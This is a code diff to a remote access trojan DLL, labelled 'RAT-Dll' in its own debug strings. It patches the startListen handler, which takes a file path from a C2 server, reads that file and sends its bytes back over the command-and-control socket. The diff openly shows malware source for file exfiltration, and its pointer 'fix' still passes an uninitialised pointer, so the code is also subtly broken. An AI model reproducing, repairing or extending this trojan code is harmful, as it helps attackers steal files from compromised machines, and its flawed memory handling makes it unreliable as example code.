@@ -112,9 +112,10 @@ INT startListen()
                      sprintf_s(msgBuf, "Performing get file on %s...\n", recvBuf);
                      OutputDebugStringA(msgBuf);
 
-                     char* fileBytes = NULL;
+                     char** fileBytes  =(char**)malloc(sizeof(char*));
                      DWORD bufferSize = 0;
-                     status = performGetFile((const char*)&recvBuf, fileBytes, &bufferSize);
+
+                    status = performGetFile((const char*)&recvBuf, *fileBytes, &bufferSize);
                      if (status != SUCCESS)
                      {
                          // Send back failure here as well 
@@ -123,10 +124,10 @@ INT startListen()
                          OutputDebugStringA(msgBuf);
                          goto cleanup;
                      }
-
-                     sprintf_s(msgBuf, "RAT-Dll-Connect::startListen - Read %s bytes from file\n", fileBytes);
+                     // was causing crash which ended our main process 
+                     sprintf_s(msgBuf, "RAT-Dll-Connect::startListen - Read %s bytes from file\n", *fileBytes);
                      OutputDebugStringA(msgBuf);
-                     OutputDebugStringA("Sending status SUCCESS back to C2; sending buffer back to C2...");
+                     OutputDebugStringA("Sending status SUCCESS back to C2; sending buffer back to C2...\n");
 
                      status = send(clientSock, "SUCCESS", 8, 0);
                      if (status == SOCKET_ERROR)
@@ -138,7 +139,7 @@ INT startListen()
                      }
 
                      // Fail here because of our pointer?
-                     status = send(clientSock, fileBytes, bufferSize, 0);
+                     status = send(clientSock, *fileBytes, bufferSize, 0);
                      if (status == SOCKET_ERROR)
                      {
                          sprintf_s(msgBuf, "RAT-Dll-Connect::startListen - Failure recevied from send (file bytes) %d\n", WSAGetLastError());
@@ -186,6 +187,8 @@ INT startListen()
         }
 
     } while (status > 0);
+
+    OutputDebugStringA("RAT-Dll::startListen - status < 0 so we're exiting...\n");
 
     // shutdown connection since we're done
     status = shutdown(clientSock, SD_SEND);
